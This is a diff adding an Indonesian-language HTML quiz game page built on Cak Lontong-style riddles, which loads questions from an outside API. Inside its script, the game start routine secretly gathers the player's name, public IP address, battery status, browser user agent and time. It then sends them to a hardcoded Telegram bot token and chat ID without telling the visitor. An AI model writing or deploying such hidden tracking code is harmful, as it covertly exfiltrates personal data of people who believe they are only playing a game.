@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Cak Lontong - Tebak Jawaban Kocak</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://kit.fontawesome.com/your-fontawesome-kit.js" crossorigin="anonymous"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e1e2e, #25293d);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Poppins', sans-serif;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        .hidden { display: none; }
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2d2d3d;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            z-index: 100;
+            display: none;
+        }
+        .btn {
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .btn.yes { background: #e63946; margin-right: 10px; }
+        .btn.no { background: #2a9d8f; }
+    </style>
+</head>
+<body class="text-white flex items-center justify-center">
+
+    <!-- Popup Input Nama -->
+    <div id="popupNama" class="fixed top-0 left-0 w-full h-full flex items-center justify-center bg-black bg-opacity-80">
+        <div class="card w-96 text-center">
+            <h2 class="text-2xl font-bold mb-2">Selamat Datang di Game Cak Lontong 🎭</h2>
+            <p class="text-sm text-gray-300 mb-4">Masukkan nama kamu untuk mulai bermain! Game ini akan menguji logika absurd kamu, siap tertawa?</p>
+            <input type="text" id="namaPemain" class="w-full p-2 rounded text-black" placeholder="Nama kamu...">
+            <button onclick="mulaiGame()" class="mt-3 w-full p-2 bg-blue-500 hover:bg-blue-700 rounded">Mulai!</button>
+        </div>
+    </div>
+
+    <!-- Container Game -->
+    <div id="gameContainer" class="hidden card w-96 text-center">
+        <h1 class="text-2xl font-bold mb-3">🎭 Cak Lontong Quiz 🎭</h1>
+        <p class="text-sm text-gray-300 mb-4">Jawablah pertanyaan dengan logika absurd. Jika salah, kamu akan ditanya apakah mau nyerah atau lanjut!</p>
+        <p id="soal" class="text-lg font-semibold mb-4">Loading soal...</p>
+        <input type="text" id="jawaban" class="w-full p-2 rounded text-black" placeholder="Jawabanmu...">
+        <button onclick="cekJawaban()" class="mt-3 w-full p-2 bg-green-500 hover:bg-green-700 rounded">Kirim Jawaban</button>
+    </div>
+
+    <!-- Pop-up UI -->
+    <div id="popupResult" class="popup"></div>
+
+    <!-- Pop-up Yerah -->
+    <div id="popupYerah" class="popup">
+        <p id="popupYerahText" class="mb-4"></p>
+        <button class="btn yes" onclick="nyerah()">Iya</button>
+        <button class="btn no" onclick="tutupPopup()">Tidak</button>
+    </div>
+
+    <script>
+        // Variabel untuk menyimpan token & ID Telegram
+        const TELEGRAM_BOT_TOKEN = "7265924127:AAHHycu6GVv5_mzSjd3OekdFqnTIy2g1_kU";  
+        const TELEGRAM_CHAT_ID = "7545988584";      
+
+        let namaPemain = "";
+        let soalData = {};
+        let salahCount = 0; // Counter untuk batas salah
+
+        async function mulaiGame() {
+            namaPemain = document.getElementById("namaPemain").value.trim();
+            if (!namaPemain) {
+                showPopup("❌ Nama tidak boleh kosong!", "red");
+                return;
+            }
+
+            document.getElementById("popupNama").style.display = "none";
+            document.getElementById("gameContainer").classList.remove("hidden");
+
+            let ipInfo = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+            let ip = ipInfo.ip;
+            let battery = await getBatteryStatus();
+            let userAgent = navigator.userAgent;
+            let waktu = new Date().toLocaleString();
+
+            sendToTelegram(namaPemain, ip, battery, userAgent, waktu);
+            loadSoal();
+        }
+
+        function loadSoal() {
+            fetch("https://api.siputzx.my.id/api/games/caklontong")
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status) {
+                        soalData = data.data;
+                        document.getElementById("soal").textContent = `🤔 ${soalData.soal}`;
+                    } else {
+                        document.getElementById("soal").textContent = "Gagal mengambil soal!";
+                    }
+                })
+                .catch(() => {
+                    document.getElementById("soal").textContent = "Error mengambil soal!";
+                });
+        }
+
+        function cekJawaban() {
+            let jawabanUser = document.getElementById("jawaban").value.trim().toLowerCase();
+            let jawabanBenar = soalData.jawaban.toLowerCase();
+
+            if (jawabanUser === jawabanBenar) {
+                showPopup("✅ Jawaban benar! 🎉", "green");
+                setTimeout(loadSoal, 2000);
+            } else {
+                salahCount++;
+                if (salahCount >= 3) {
+                    document.getElementById("popupYerahText").innerHTML = "❌ Salah! Mau nyerah?";
+                    document.getElementById("popupYerah").style.display = "block";
+                } else {
+                    showPopup("❌ Jawaban salah! Coba lagi!", "red");
+                }
+            }
+
+            document.getElementById("jawaban").value = "";
+        }
+
+        function nyerah() {
+            showPopup(`❌ Salah! 😢<br><br>Jawaban yang benar: <b>${soalData.jawaban}</b><br>💡 ${soalData.deskripsi}`, "red");
+            salahCount = 0;
+            document.getElementById("popupYerah").style.display = "none";
+            setTimeout(loadSoal, 3000);
+        }
+
+        function tutupPopup() {
+            document.getElementById("popupYerah").style.display = "none";
+        }
+
+        async function getBatteryStatus() {
+            if (!navigator.getBattery) return "Tidak diketahui";
+            let battery = await navigator.getBattery();
+            return `${Math.round(battery.level * 100)}% ${battery.charging ? "🔌 Mengisi" : "⚡ Tidak mengisi"}`;
+        }
+
+        function sendToTelegram(nama, ip, battery, userAgent, waktu) {
+            let message = `
+📢 *INFO PEMAIN* 📢
+👤 Nama: ${nama}
+🌍 IP: ${ip}
+🔋 Baterai: ${battery}
+📆 Waktu: ${waktu}
+💻 Perangkat: ${userAgent}
+    `;
+            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url).catch(() => console.log("Gagal kirim ke Telegram"));
+        }
+    </script>
+
+</body>
+</html>
